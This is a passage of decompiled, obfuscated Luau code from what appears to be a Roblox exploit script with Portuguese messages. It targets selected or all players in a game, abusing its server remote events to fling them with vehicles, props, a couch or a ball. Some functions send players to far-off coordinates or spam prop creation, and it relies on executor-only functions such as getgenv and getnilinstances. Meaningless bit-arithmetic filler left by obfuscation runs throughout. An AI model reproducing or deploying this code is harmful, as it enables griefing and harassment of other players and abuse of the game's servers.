			local n20 = 319719494
			local flag = bit32.bxor(bit32.bxor(v41, 0), 49487785) == 136629227
			local n21 = 1948264350
			local n22 = bit32.bxor(v41, 2201374249)
			local n23 = 2727544965
			if not upv4 or not arg or not arg.Character or not chinookAgency or not chinookAgency.Parent then
				upv4 = false
				return
			end
			local character3 = arg.Character
			local humanoidRootPart3 = character3 and character3:FindFirstChild("HumanoidRootPart")
			character3 = character3 and character3:FindFirstChildOfClass("Humanoid")
			local flag2 = not humanoidRootPart3 or not character3

			if not flag2 then
				flag2 = character3.Health <= 0
				n22 = bit32.bor(n22, n23) + 1610479611
			end

			if flag2 then
				upv4 = false
				return
			end
			n14 += deltaTime
			local n24 = n16 - n15
			local n25 = n15 + math.sin(n14 * 10) * n24 / 2
			local n26 = n19 * n14
			local v42 = math
			local n27 = bit32.bxor(n20, 280675855) + 2168042120 + 2126925176
			local n28 = v42.cos(n26) * n25
			local v43 = math.sin(n26)
			local v44 = bit32.bxor(n27, 53312172)
			local n29 = humanoidRootPart3.CFrame.LookVector * math.sin(n14 * n18) * n17
			local n30 = humanoidRootPart3.Position + Vector3.new(n28, 5, v43 * n25) + n29
			local v45 = pcall

			local function fn2()
				chinookAgency:SetPrimaryPartCFrame(CFrame.new(n30, humanoidRootPart3.Position))
				bodyForce.Force = (humanoidRootPart3.Position - chinookAgency.PrimaryPart.Position).Unit * 1000000 + Vector3.new(0, workspace.Gravity * chinookAgency.PrimaryPart:GetMass(), 0)
			end

			v45(fn2)

			if tick() - now > 12 then
				upv4 = false
			end
		end)

		while upv4 and tick() - now < 12 do
			task.wait()
		end

		stopFling()
		return
	end

	warn("ClickDetector não encontrado.")
end

-- payload closure created 804-th (proto #513)
local function payload_fn_804()
	local n2 = 2441413040
	local n3 = 4224306208
	local n4 = 797312548
	upv1 = false

	if upv2 then
		upv2:Disconnect()
		upv2 = nil
	end

	flingConnection:Disconnect()
	flingConnection = nil

	pcall(function()
		soccerBall.Anchored = originalProperties.Anchored
		soccerBall.CanCollide = originalProperties.CanCollide
		soccerBall.CanTouch = originalProperties.CanTouch
	end)

	pcall(function()
		if couch:IsA("BasePart") and originalProperties then
			couch.Anchored = originalProperties.Anchored
			couch.CanCollide = originalProperties.CanCollide
			couch.CanTouch = originalProperties.CanTouch
		end
	end)

	upv3()
	local tbl = { "DeleteAllVehicles" }

	pcall(function()
		upv4:WaitForChild("RE"):WaitForChild("1Ca1r"):FireServer(unpack(tbl))
	end)

	task.wait(0.2)
	local character = upv5.Character

	if character then
		local v = ipairs
		local v2 = table.pack(character:GetDescendants())
		local v3 = bit32.band(n3, n2)

		for _, v4 in v(table.unpack(v2, 1, v2.n)) do
			if v4:IsA("BasePart") then
				v4.Velocity = Vector3.zero
				v4.RotVelocity = Vector3.zero

				if v4.Name == "Head" or v4.Name == "Torso" or v4.Name == "UpperTorso" or v4.Name == "LowerTorso" then
					v4.CanCollide = true
				elseif v4.Name == "HumanoidRootPart" or v4:FindFirstAncestorOfClass("Accessory") then
					v4.CanCollide = false
				end
			end
		end
	end

	local humanoid = character and character:FindFirstChild("Humanoid")

	if humanoid then
		humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
		humanoid.Sit = false
		humanoid.PlatformStand = false
	end

	for _, descendant in ipairs(upv6:GetDescendants()) do
		if descendant:IsA("Seat") or descendant:IsA("VehicleSeat") then
			descendant.Disabled = false
		end
	end

	pcall(function()
		upv4:WaitForChild("RE"):WaitForChild("1Clothe1s"):FireServer("CharacterSizeUp", 1)
	end)

	task.wait(0.5)
	local v = savedPosition

	if character and character:FindFirstChild("HumanoidRootPart") and v then
		local humanoidRootPart = character.HumanoidRootPart
		local n5 = 104120456

		pcall(function()
			humanoidRootPart.Anchored = true
			humanoidRootPart.Velocity = Vector3.zero
			humanoidRootPart.RotVelocity = Vector3.zero
			humanoidRootPart.CFrame = CFrame.new(v + Vector3.new(0, 5, 0))
			task.wait(0.2)
			humanoidRootPart.Velocity = Vector3.zero
			humanoidRootPart.RotVelocity = Vector3.zero
			humanoidRootPart.Anchored = false
			humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
			humanoid.WalkSpeed = 16
			humanoid.JumpPower = 50
		end)
	end

	savedPosition = nil
end

-- payload closure created 805-th (proto #t5676)
local function payload_fn_805()
	return true
end

-- payload closure created 806-th (proto #512)
local function payload_fn_806(arg)
	local n2 = 770322811
	local n3 = 3300947482
	local n4 = 1101126651

	if arg then
		if upv1 or upv2 or upv3 then
			if upv4 then
				local n5 = 812143346

				pcall(function()
					upv4:Set(false)
				end)
			end

			return
		end

		if not upv5 or not upv5.Character then
			game:GetService("StarterGui"):SetCore("SendNotification", { Title = "Opa!", Text = "Selecione um jogador na lista primeiro!", Duration = 4 })

			if upv4 then
				pcall(function()
					upv4:Set(false)
				end)
			end

			return
		end

		if not upv6(upv7) then
			if upv4 then
				pcall(function()
					upv4:Set(false)
				end)
			end

			return
		end

		if upv7 == "Fling Part" then
			upv8(upv5)
		elseif upv7 == "Bola V2" then
			local v = upv9
			local v2 = upv5
			local v3 = bit32.lshift(n4, 21)
			v(v2)
		elseif upv7 == "Chinook" then
			upv10(upv5)
		else
			local flag = upv7 == "Heli"

			if flag then
				upv11(upv5)
			elseif upv7 == "Jet" then
				upv12(upv5)
			elseif upv7 == "Barco" then
				upv13(upv5)
			elseif upv7 == "Sofá" then
				upv14(upv5)
				local n5 = bit32.lshift(n3, 31) - 994019814
			elseif upv7 == "Ônibus" then
				upv15(upv5)
			elseif upv7 == "Gyrosphere" then
				upv16.run(upv5, "fling", "gyro")
			else
				local n5 = n3 // 14

				if upv7 == "Guincho" then
					upv17(upv5)
				elseif upv4 then
					pcall(function()
						upv4:Set(false)
					end)
				end
			end
		end
	else
		upv18(false)

		if upv7 == "Bola V2" then
			local n5 = 977273527
			getgenv().FlingAtivo = false

			pcall(function()
				game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Too1l"):InvokeServer(unpack({ "PickingTools", "SoccerBall" }))
			end)
		end

		upv19()
		getgenv().DoorFlingAtivo = false
	end
end

-- payload closure created 810-th (proto #533)
local function payload_fn_810()
	local n2 = 8633822138

	pcall(function()
		upv1:FireServer("ClearAllProps")
	end)
end

-- payload closure created 811-th (proto #t2491)
local function payload_fn_811(arg, arg2)
	local flag = type(137310703) == "userdata"
	local n2 = 4526574045

	pcall(function()
		upv1:FireServer("filterClick", { name = arg, itemType = "Props" })
	end)

	task.wait(0.08)
	upv2:FireServer("RequestingPropName", arg, arg2)
end

-- payload closure created 812-th (proto #t5225)
local function payload_fn_812(arg)
	if type(getnilinstances) ~= "function" then
		return nil
	end
	local v = next
	local v2, v3 = getnilinstances()

	for _, v4 in v, v2, v3 do
		if v4.ClassName == "RemoteEvent" and (not arg or v4.Name == arg) then
			return v4
		end
	end

	return nil
end

-- payload closure created 813-th (proto #t5478)
local function payload_fn_813(arg)
	if arg then
		local toolPropMake = arg:FindFirstChild("Tool_PropMake")
		if toolPropMake and toolPropMake:IsA("RemoteEvent") then
			return toolPropMake
		end
		local remoteEvent = arg:FindFirstChildWhichIsA("RemoteEvent", true)
		if remoteEvent then
			return remoteEvent
		end
	end

	return upv1("RemoteEvent")
end

-- payload closure created 814-th (proto #t4325)
local function payload_fn_814(arg)
	return upv1.Backpack and upv1.Backpack:FindFirstChild("PropMaker") or arg and arg:FindFirstChild("PropMaker") or upv1.StarterGear and upv1.StarterGear:FindFirstChild("PropMaker")
end

-- payload closure created 815-th (proto #t8523)
local function payload_fn_815(arg, arg2)
	local now = os.clock()
	local v = upv1(arg)

	while not v and os.clock() - now < arg2 do
		task.wait(0.1)
		arg = upv2.Character or arg
		v = upv1(arg)
	end

	return v
end

-- payload closure created 816-th (proto #529)
local function payload_fn_816()
	local n001TrafficCones = workspace:FindFirstChild("WorkspaceCom") and workspace.WorkspaceCom:FindFirstChild("001_TrafficCones")
	if not n001TrafficCones then
		return {}
	end
	local tbl = {}

	for _, child in ipairs(n001TrafficCones:GetChildren()) do
		if child.Name:find(upv1.Name, 1, true) and child:FindFirstChild("SetCurrentCFrame") then
			table.insert(tbl, child)
		end
	end

	return tbl
end

-- payload closure created 817-th (proto #528)
local function payload_fn_817()
	return #upv1() > 0
end

-- payload closure created 818-th (proto #527)
local function payload_fn_818(arg, arg2, arg3)
	local n2 = 2754519267
	local n3 = 134975520
	local character = upv1.Character or upv1.CharacterAdded:Wait()
	local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

	if upv2() then
		upv3:FireServer("ClearAllTools")
		arg3()
		return
	end

	upv4:InvokeServer("PickingTools", "PropMaker")
	task.wait(0.5)
	local v = upv5
	local v2 = bit32.bor(n2, 1333066955)
	local v3 = v(character, 3)
	if not v3 then
		warn("PropMaker nao apareceu na Backpack nem na mao.")
		return
	end

	if upv1.StarterGear and not upv1.StarterGear:FindFirstChild("PropMaker") then
		local starterGear = upv1.StarterGear
		v3:Clone().Parent = starterGear
	end

	local v4 = upv6(character)
	local humanoid = character:FindFirstChildOfClass("Humanoid")

	if v4 and humanoid and v4.Parent ~= character then
		humanoid:EquipTool(v4)
	end

	local wait = task.wait
	wait(0.5)
	local v5 = upv6(character) or v4
	upv7(arg2 and "LightsSpotLightWhite" or "FurnitureBleachers", arg2 and "Lights" or "Furniture")
	task.wait(0.5)
	local v6 = upv8(v5)
	if not v6 then
		warn("Remote de colocar prop nao encontrado. Envie o remote spy do clique no chao com o nome/parent do RemoteEvent.")
		return
	end
	local model = workspace:WaitForChild("Model", 5)
	if not model then
		warn("workspace.Model nao encontrado para criar prop.")
		return
	end
	local wedge = model:FindFirstChild("Wedge") or model:FindFirstChildOfClass("Part") or model:FindFirstChildOfClass("Model") or model:GetChildren()[1]

	if not wedge then
		local v7 = warn
		v7("Nenhum modelo base encontrado dentro de workspace.Model.")
		return
	end

	for i = 1, arg do
		local n4 = math.random() * 3.1415926535897931 * 2
		local n5 = humanoidRootPart.Position + humanoidRootPart.CFrame.LookVector * 8 + Vector3.new(math.cos(n4) * 8, -3, math.sin(n4) * 8)
		v6:FireServer(wedge, vector.create(n5.X, n5.Y, n5.Z))
		task.wait(0.08)
	end

	if v5 and v5.Parent == character then
		v5.Parent = upv1.StarterGear
	end

	local now = os.clock()

	while true do
		task.wait(0.2)
		if not (upv2() or os.clock() - now > 6) then
			continue
		end
		break
	end

	if not upv2() then
		warn("Props nao apareceram depois de criar. Confira o remote de colocar prop no chao.")
		return
	end
	upv3:FireServer("ClearAllTools")
	arg3()
end

-- payload closure created 819-th (proto #518)
local function payload_fn_819()
	local tbl = {}

	for _, player in ipairs(upv1:GetPlayers()) do
		if player.Name ~= upv2.Name then
			table.insert(tbl, player.Name)
		end
	end

	return tbl
end

-- payload closure created 820-th (proto #519)
local function payload_fn_820(target)
	upv1 = target
	getgenv().Target = target
end

-- payload closure created 821-th (proto #520)
local function payload_fn_821()
	local players = upv1:GetPlayers()
	local tbl = {}

	if upv2 and #players > 0 then
		for _, player in ipairs(players) do
			if player.Name ~= upv3.Name then
				table.insert(tbl, player.Name)
			end
		end

		upv2:Set(tbl)

		if upv4 and not upv1:FindFirstChild(upv4) then
			upv4 = nil
			getgenv().Target = nil
			upv2:SetValue("")
		end
	end
end

-- payload closure created 822-th (proto #521)
local function payload_fn_822(arg)
	local flag = type(0) == "vector"
	upv1 = arg
	local n2 = 488341109

	if upv2 then
		upv2()
	end

	if not arg then
		if upv3 then
			upv3:Disconnect()
			upv3 = nil
		end

		upv4()
		return
	end

	if not upv5 or not upv6:FindFirstChild(upv5) then
		upv7:Set(false)
		return
	end
	local n3 = n2 + 102838185

	task.spawn(function()
		local flag2 = bit32.bxor(n3, 0) + 136091111 == 369198094
		local n4 = 591610495

		upv8(250, true, function()
			local n5 = 311676386
			local v = upv9()
			if #v == 0 then
				upv7:Set(false)
				return
			end
			local tbl = {}
			local v2 = bit32.bxor(n5, 316285440)
			local tbl2 = {}
			local n6 = #v

			for i, v3 in ipairs(v) do
				local setCurrentCFrame = v3:FindFirstChild("SetCurrentCFrame")

				if setCurrentCFrame then
					table.insert(tbl, setCurrentCFrame)
					tbl2[#tbl] = (i - 1) / math.max(n6 - 1, 1) * 5 - 2.5
				end
			end

			local n7 = #tbl
			if n7 == 0 then
				upv7:Set(false)
				return
			end
			local n8 = 0
			local v3 = upv10
			local n9 = bit32.bxor(v2, 326222132) + 1217927332
			local v4 = table.pack(bit32.band(n7, 4294967295))
			local v5 = table.pack(bit32.band(v4[1], 65535))
			local v6 = bit32.band(6308 * v5[1] + bit32.lshift(bit32.band(6308 * bit32.rshift(v4[1], 16) + 18584 * v5[1], 65535), 16), 4294967295)
			local v7 = table.pack(bit32.band(bit32.bnot(n7), 4294967295))
			local v8 = table.pack(bit32.band(v7[1], 65535))
			local n10 = n9 + v6 + bit32.band(6308 * v8[1] + bit32.lshift(bit32.band(6308 * bit32.rshift(v7[1], 16) + 18584 * v8[1], 65535), 16), 4294967295)

			upv3 = v3.Heartbeat:Connect(function(deltaTime)
				if not upv1 then
					if upv3 then
						upv3:Disconnect()
						upv3 = nil
					end

					return
				end

				n8 += deltaTime
			end)
		end)
	end)
end

-- payload closure created 823-th (proto #t8460)
local function payload_fn_823()
	local v = upv1()

	for _, v2 in ipairs(v) do
		local setCurrentCFrame = v2:FindFirstChild("SetCurrentCFrame")
		if setCurrentCFrame then
			return v2, setCurrentCFrame
		end
	end

	return nil, nil
end

-- payload closure created 824-th (proto #t6334)
local function payload_fn_824(arg, arg2, arg3)
	if arg.Sit then
		return arg3.CFrame * CFrame.new(0, 0, -2)
	end

	if arg.MoveDirection.Magnitude > 0.1 then
		return arg2.CFrame * CFrame.new(0, -1, -6)
	end
	return arg2.CFrame * CFrame.new(0, -2.4 + (math.sin(os.clock() * 12) + 1) / 2 * 2.2, -0.25)
end

-- payload closure created 825-th (proto #522)
local function payload_fn_825(arg)
	local n2 = 92896941
	local flag = type(0) == "string"
	upv1 = arg

	if upv2 then
		upv2()
	end

	if not arg then
		if upv3 then
			coroutine.close(upv3)
			upv3 = nil
		end

		upv4 = false
		upv5()
		return
	end

	if not upv6 or not upv7:FindFirstChild(upv6) then
		upv8:Set(false)
		return
	end
	local n3 = n2 + 115766873 + 244325004

	task.spawn(function()
		local flag2 = bit32.bxor(n3, 0) ~= 452988818
		local n4 = 299812739

		upv9(2, false, function()
			local n5 = 28381749
			if not upv7:FindFirstChild(upv6) then
				upv8:Set(false)
				return
			end
			local v = upv10
			local v2 = table.pack(bit32.band(n5, 4294967295))
			local v3 = table.pack(bit32.band(v2[1], 65535))
			local n6 = bit32.band(43686 * v3[1] + bit32.lshift(bit32.band(43686 * bit32.rshift(v2[1], 16) + 25298 * v3[1], 65535), 16), 4294967295) + 1188211980
			local v4 = table.pack(bit32.band(bit32.bor(n5, 469125282), 4294967295))
			local v5 = table.pack(bit32.band(v4[1], 65535))
			local v6 = bit32.band(21851 * v5[1] + bit32.lshift(bit32.band(21851 * bit32.rshift(v4[1], 16) + 40237 * v5[1], 65535), 16), 4294967295)
			local v7 = table.pack(bit32.band(bit32.band(n5, 469125282), 4294967295))
			local v8 = table.pack(bit32.band(v7[1], 65535))
			local n7 = n6 + v6 + bit32.band(21849 * v8[1] + bit32.lshift(bit32.band(21849 * bit32.rshift(v7[1], 16) + 40237 * v8[1], 65535), 16), 4294967295)
			local v9
			v9, v9 = v()
			if not v9 then
				upv8:Set(false)
				return
			end

			upv3 = task.spawn(function()

				while upv1 and upv7:FindFirstChild(upv6) do
					local v10 = upv7:FindFirstChild(upv6)

					if v10 and v10.Character then
						local character = upv11.Character

						if character then
							local humanoid = v10.Character:FindFirstChildOfClass("Humanoid")
							local humanoidRootPart = v10.Character:FindFirstChild("HumanoidRootPart")
							local humanoidRootPart2 = character:FindFirstChild("HumanoidRootPart")

							if humanoidRootPart and humanoid and humanoidRootPart2 and humanoid.Health > 0 then
								if humanoid.Sit then
									if not upv4 then
										upv4 = true
									end
								elseif upv4 then
									upv4 = false
								end

								v9:InvokeServer(upv12(humanoid, humanoidRootPart, humanoidRootPart2))
							end
						end
					end

					task.wait(0.05)
				end

				upv3 = nil

				if upv1 then
					upv8:Set(false)
				end

				upv1 = false
				upv4 = false
			end)
		end)
	end)
end

-- payload closure created 826-th (proto #523)
local function payload_fn_826()
	local n2 = 281260514
	if upv1 then
		return
	end

	if not upv2 or not upv3:FindFirstChild(upv2) then
		return
	end
	upv1 = true
	local n3 = n2 + 299208337 - 170042051

	task.spawn(function()
		local flag = bit32.bxor(bit32.bxor(n3, 0), 102625792) ~= 510357424
		local n4 = 894474504

		upv4(2, false, function()
			local v, v2 = upv5()
			local n5 = 4427348345

			if not v2 then
				upv1 = false
				upv6()
				return
			end

			local v3 = task
			local v4 = bit32.bxor(n5, 330295270)

			upv9 = v3.spawn(function()
				local now = os.clock()
				local flag2

				while true do
					local flag3 = upv1 and os.clock() - now < 12
					flag2 = false

					if flag3 then
						local v5 = upv3:FindFirstChild(upv2)
						local character = upv7.Character

						if not (not v5 or not v5.Character or not character) then
							local humanoid = v5.Character:FindFirstChildOfClass("Humanoid")
							local humanoidRootPart = v5.Character:FindFirstChild("HumanoidRootPart")
							local humanoidRootPart2 = character:FindFirstChild("HumanoidRootPart")

							if not (not humanoid or not humanoidRootPart or not humanoidRootPart2 or humanoid.Health <= 0) then
								v2:InvokeServer(upv8(humanoid, humanoidRootPart, humanoidRootPart2))

								if (humanoidRootPart.Position - humanoidRootPart2.Position).Magnitude <= 6 then
									flag2 = true
									break
								else
									task.wait(0.04)
									continue
								end
							end
						end
					end

					break
				end

				if flag2 then
					task.wait(0.2)
				end

				upv9 = nil
				upv1 = false
				upv6()
			end)
		end)
	end)
end

-- payload closure created 827-th (proto #524)
local function payload_fn_827(arg)
	local n2 = 21111850
	local flag = type(0) == "thread"
	upv1 = arg

	if upv2 then
		upv2()
	end

	if not arg then
		if upv3 then
			coroutine.close(upv3)
			upv3 = nil
		end

		upv4 = false
		upv5()
		return
	end

	if not upv6 or not upv7:FindFirstChild(upv6) then
		upv8:Set(false)
		return
	end
	local n3 = n2 + 188972951 + 164894071

	task.spawn(function()
		local flag2 = bit32.bxor(n3, 0) ~= 374978872
		local n4 = 478663478

		local function fn()
			local n5 = 455633107
			local n001TrafficCones = workspace:FindFirstChild("WorkspaceCom") and workspace.WorkspaceCom:FindFirstChild("001_TrafficCones")
			if not n001TrafficCones then
				upv8:Set(false)
				return
			end
			local v = upv7:FindFirstChild(upv6)
			local v2 = table.pack(bit32.band(n5, 4294967295))
			local v3 = table.pack(bit32.band(v2[1], 65535))
			local n6 = bit32.band(36720 * v3[1] + bit32.lshift(bit32.band(36720 * bit32.rshift(v2[1], 16) + 1742 * v3[1], 65535), 16), 4294967295) + 2348990064
			local v4 = table.pack(bit32.band(bit32.bor(n5, 484149393), 4294967295))
			local v5 = table.pack(bit32.band(v4[1], 65535))
			local v6 = bit32.band(28817 * v5[1] + bit32.lshift(bit32.band(28817 * bit32.rshift(v4[1], 16) + 63793 * v5[1], 65535), 16), 4294967295)
			local v7 = table.pack(bit32.band(bit32.band(n5, 484149393), 4294967295))
			local v8 = table.pack(bit32.band(v7[1], 65535))
			local v9 = bit32.bxor(n6 + v6 + bit32.band(28815 * v8[1] + bit32.lshift(bit32.band(28815 * bit32.rshift(v7[1], 16) + 63793 * v8[1], 65535), 16), 4294967295), 376988165)
			if not v then
				upv8:Set(false)
				return
			end
			local v10 = n001TrafficCones:FindFirstChild("Prop" .. upv10.Name)
			if not v10 then
				upv8:Set(false)
				return
			end
			local setCurrentCFrame = v10:FindFirstChild("SetCurrentCFrame")
			if not setCurrentCFrame then
				upv8:Set(false)
				return
			end

			upv3 = task.spawn(function()

				while upv1 and upv7:FindFirstChild(upv6) do
					local v11 = upv7:FindFirstChild(upv6)

					if v11 and v11.Character then
						local humanoid = v11.Character:FindFirstChildOfClass("Humanoid")
						local humanoidRootPart = v11.Character:FindFirstChild("HumanoidRootPart")

						if humanoidRootPart and humanoid and humanoid.Health > 0 then
							if humanoid.Sit then
								if not upv4 then
									upv4 = true
									setCurrentCFrame:InvokeServer(CFrame.new(0, -9999, 0))
								end
							else
								if upv4 then
									upv4 = false
								end

								setCurrentCFrame:InvokeServer(upv11(humanoid, humanoidRootPart, humanoidRootPart))
							end
						end
					end

					task.wait(0.05)
				end

				upv3 = nil

				if upv1 then
					upv8:Set(false)
				end

				upv1 = false
				upv4 = false
			end)
		end

		upv9(2, false, fn)
	end)
end

-- payload closure created 828-th (proto #t2302)
local function payload_fn_828(arg)
	if upv1[arg] then
		local v = upv1[arg]
		upv1[arg] = nil
		pcall(coroutine.close, v)
	end

	upv2[arg] = nil
end

-- payload closure created 829-th (proto #t3256)
local function payload_fn_829(arg, arg2)
	local n2 = 101635377

	if upv1[arg] then
		upv2(arg)
	end

	upv3[arg] = false
	local v = bit32.bxor(n2, 95767543)
	local v2 = upv1
	local v3 = task
	local v4 = table.pack(bit32.band(v, 4294967295))
	local v5 = table.pack(bit32.band(v4[1], 65535))
	local n3 = bit32.band(34832 * v5[1] + bit32.lshift(bit32.band(34832 * bit32.rshift(v4[1], 16) + 28154 * v5[1], 65535), 16), 4294967295) + 643043952
	local v6 = table.pack(bit32.band(bit32.bor(v, 30135719), 4294967295))
	local v7 = table.pack(bit32.band(v6[1], 65535))
	local v8 = bit32.band(30705 * v7[1] + bit32.lshift(bit32.band(30705 * bit32.rshift(v6[1], 16) + 37381 * v7[1], 65535), 16), 4294967295)
	local v9 = table.pack(bit32.band(bit32.band(v, 30135719), 4294967295))
	local v10 = table.pack(bit32.band(v9[1], 65535))
	local n4 = n3 + v8 + bit32.band(30703 * v10[1] + bit32.lshift(bit32.band(30703 * bit32.rshift(v9[1], 16) + 37381 * v10[1], 65535), 16), 4294967295)

	v2[arg] = v3.spawn(function()

		while true do
			if upv4 and upv5:FindFirstChild(arg.Name) then
				if not (not arg.Character or not arg.Character.Parent) then
					local humanoid = arg.Character:FindFirstChildOfClass("Humanoid")
					local humanoidRootPart = arg.Character:FindFirstChild("HumanoidRootPart")

					if not (not humanoidRootPart or not humanoid or humanoid.Health <= 0) then
						local v11 = upv3[arg]

						if humanoid.Sit then
							if not v11 then
								upv3[arg] = true
								arg2:InvokeServer(CFrame.new(0, -9999, 0))
							end
						else
							if v11 then
								upv3[arg] = false
							end

							arg2:InvokeServer(upv6(humanoid, humanoidRootPart, humanoidRootPart))
						end

						task.wait(0.05)
						continue
					end
				end
			end

			break
		end

		if upv4 then
			upv2(arg)
		end
	end)
end

-- payload closure created 830-th (proto #532)
local function payload_fn_830()
	local tbl = {}

	for k in pairs(upv1) do
		if not upv2:FindFirstChild(k.Name) or not k.Character or not k.Character:FindFirstChild("Humanoid") or k.Character:FindFirstChildOfClass("Humanoid").Health <= 0 then
			table.insert(tbl, k)
		end
	end

	for _, v in ipairs(tbl) do
		upv3(v)
	end

	local v = upv4()
	if #v == 0 then
		return
	end
	local tbl2 = {}

	for _, player in ipairs(upv2:GetPlayers()) do
		if player ~= upv5 and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
			local humanoid = player.Character:FindFirstChildOfClass("Humanoid")

			if humanoid and humanoid.Health > 0 then
				table.insert(tbl2, player)
			end
		end
	end

	local n2 = 1

	for _, v2 in ipairs(tbl2) do
		if not (#v < n2) then
			if not upv1[v2] then
				local setCurrentCFrame = v[n2]:FindFirstChild("SetCurrentCFrame")

				if setCurrentCFrame then
					upv6(v2, setCurrentCFrame)
					n2 += 1
				end
			else
				n2 += 1
			end

			continue
		end

		break
	end
end

-- payload closure created 831-th (proto #525)
local function payload_fn_831(arg)
	upv1 = arg
	local n2 = 807382591

	if upv2 then
		upv2()
	end

	if not arg then
		local tbl = {}

		for k in pairs(upv3) do
			table.insert(tbl, k)
		end

		for _, v in ipairs(tbl) do
			upv4(v)
		end

		if upv5 then
			local v = upv5
			upv5 = nil
			pcall(coroutine.close, v)
		end

		upv6()
		return
	end

	local n3 = n2 + 86902663

	task.spawn(function()
		local n4 = 67086282


		local n5 = n4 + 333729734 - 139280363

		local function fn()
			local flag = bit32.bxor(n5, 0) ~= 261535653
			local n6 = 792466457
			local n7 = #upv8()
			if n7 == 0 then
				upv9:Set(false)
				return
			end
			local v = task
			local v2 = table.pack(bit32.band(n7, 4294967295))
			local v3 = table.pack(bit32.band(v2[1], 65535))
			local v4 = bit32.band(32369 * v3[1] + bit32.lshift(bit32.band(32369 * bit32.rshift(v2[1], 16) + 59146 * v3[1], 65535), 16), 4294967295)
			local v5 = table.pack(bit32.band(bit32.bnot(n7), 4294967295))
			local v6 = table.pack(bit32.band(v5[1], 65535))
			local n8 = 3935934528 + n6 + v4 + bit32.band(32369 * v6[1] + bit32.lshift(bit32.band(32369 * bit32.rshift(v5[1], 16) + 59146 * v6[1], 65535), 16), 4294967295)

			upv5 = v.spawn(function()
				while upv1 do
					upv10()
					task.wait(0.5)
				end

				upv5 = nil
			end)
		end

		upv7(250, false, fn)
	end)
end

-- payload closure created 836-th (proto #538)
local function payload_fn_836()
	local n001TrafficCones = workspace:FindFirstChild("WorkspaceCom") and workspace.WorkspaceCom:FindFirstChild("001_TrafficCones")
	if not n001TrafficCones then
		return {}
	end
	local tbl = {}

	for _, child in ipairs(n001TrafficCones:GetChildren()) do
		if child.Name:find(upv1.Name, 1, true) and child:FindFirstChild("SetCurrentCFrame") then
			table.insert(tbl, child)
		end
	end

	return tbl
end

-- payload closure created 837-th (proto #t4514)
local function payload_fn_837(arg)
	if upv1[arg] then
		local v = upv1[arg]
		upv1[arg] = nil
		pcall(coroutine.close, v)
	end

	upv2[arg] = nil
	upv3[arg] = nil
end

-- payload closure created 838-th (proto #t8028)
local function payload_fn_838(arg, arg2)
	local n2 = 177823096

	if upv1[arg] then
		upv2(arg)
	end

	upv3[arg] = false
	local v = bit32.bxor(n2, 257492826)
	local v2 = upv1
	local v3 = task
	local v4 = table.pack(bit32.band(v, 4294967295))
	local v5 = table.pack(bit32.band(v4[1], 65535))
	local n3 = bit32.band(39867 * v5[1] + bit32.lshift(bit32.band(39867 * bit32.rshift(v4[1], 16) + 4395 * v5[1], 65535), 16), 4294967295) + 4279018715
	local v6 = table.pack(bit32.band(bit32.bor(v, 15612257), 4294967295))
	local v7 = table.pack(bit32.band(v6[1], 65535))
	local v8 = bit32.band(51338 * v7[1] + bit32.lshift(bit32.band(51338 * bit32.rshift(v6[1], 16) + 56744 * v7[1], 65535), 16), 4294967295)
	local v9 = table.pack(bit32.band(bit32.bxor(v, 15612257), 4294967295))
	local v10 = table.pack(bit32.band(v9[1], 65535))
	local n4 = n3 + v8 + bit32.band(39868 * v10[1] + bit32.lshift(bit32.band(39868 * bit32.rshift(v9[1], 16) + 4395 * v10[1], 65535), 16), 4294967295)

	local function fn()

		while true do
			if upv4 and upv5:FindFirstChild(arg.Name) then
				if not (not arg.Character or not arg.Character.Parent) then
					local character = upv6.Character

					if character then
						local humanoid = arg.Character:FindFirstChildOfClass("Humanoid")
						local humanoidRootPart = arg.Character:FindFirstChild("HumanoidRootPart")
						local humanoidRootPart2 = character:FindFirstChild("HumanoidRootPart")

						if not (not humanoidRootPart or not humanoid or not humanoidRootPart2 or humanoid.Health <= 0) then
							local v11 = upv3[arg]

							if humanoid.Sit then
								if not v11 then
									upv3[arg] = true
									arg2:InvokeServer(humanoidRootPart2.CFrame * CFrame.new(0, 0, -2))
								end
							else
								if v11 then
									upv3[arg] = false
								end

								arg2:InvokeServer(upv7(humanoid, humanoidRootPart, humanoidRootPart2))
							end

							task.wait(0.005)
							continue
						end
					end
				end
			end

			break
		end

		if upv4 then
			upv2(arg)
		end
	end

	v2[arg] = v3.spawn(fn)
end

-- payload closure created 839-th (proto #540)
local function payload_fn_839()
	local tbl = {}

	for k in pairs(upv1) do
		if not upv2:FindFirstChild(k.Name) or not k.Character then
			table.insert(tbl, k)
		end
	end

	for _, v in ipairs(tbl) do
		upv3(v)
	end

	local v = upv4()
	if #v == 0 then
		return
	end
	local tbl2 = {}

	for _, player in ipairs(upv2:GetPlayers()) do
		if player ~= upv5 and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
			local humanoid = player.Character:FindFirstChildOfClass("Humanoid")

			if humanoid and humanoid.Health > 0 then
				table.insert(tbl2, player)
			end
		end
	end

	local n2 = 1

	for _, v2 in ipairs(tbl2) do
		if not (#v < n2) then
			if not upv1[v2] then
				local v3 = v[n2]
				local setCurrentCFrame = v3:FindFirstChild("SetCurrentCFrame")

				if setCurrentCFrame then
					upv6[v2] = v3
					upv7(v2, setCurrentCFrame)
					n2 += 1
				end
			else
				n2 += 1
			end

			continue
		end

		break
	end

	local tbl3 = {}

	for k in pairs(upv1) do
		table.insert(tbl3, k)
	end

	for _, v2 in ipairs(tbl3) do
		local flag = false

		for _, v3 in ipairs(tbl2) do
			if v3 == v2 then
				flag = true
				break
			end
		end

		if not flag then
			upv3(v2)
		end
	end
end

-- payload closure created 840-th (proto #535)
local function payload_fn_840(arg)
	local n2 = 215770237
	upv1 = arg

	if upv2 then
		upv2()
	end

	local n3 = n2 + 420309791

	if not arg then
		local tbl = {}

		for k in pairs(upv3) do
			table.insert(tbl, k)
		end

		for _, v in ipairs(tbl) do
			upv4(v)
		end

		if upv5 then
			local v = upv5
			upv5 = nil
			pcall(coroutine.close, v)
		end

		upv6()
		return
	end

	local n4 = n3 - 222146265

	task.spawn(function()
		local flag = bit32.bxor(n4, 0) == 71565298
		local n5 = 781461901

		upv7(160, false, function()
			local flag2 = bit32.bxor(n5, 0) == 282354563
			local n6 = 497525706
			if #upv8() == 0 then
				upv9:Set(false)
				return
			end

			upv5 = task.spawn(function()
				while upv1 do
					upv10()
					task.wait(0.5)
				end

				upv5 = nil
			end)
